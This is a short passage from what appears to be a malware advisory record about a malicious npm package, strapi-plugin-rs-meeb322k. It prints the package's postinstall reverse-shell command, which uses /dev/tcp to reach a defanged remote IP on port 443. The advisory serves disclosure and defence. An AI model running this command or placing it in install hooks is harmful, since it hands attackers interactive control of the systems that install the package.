  "summary": "Malicious code in strapi-plugin-rs-meeb322k (npm)",
  "details": "The package's postinstall hook executes a bash reverse shell. postinstall.js spawns `bash -c 'bash -i \u003e /dev/tcp/14[.]225[.]210[.]85/443 2\u003e\u00261'`, opening an interactive shell back to the remote host 14[.]225[.]210[.]85 on TCP port 443 whenever the package is installed. The package description identifies itself as a reverse-shell payload.",
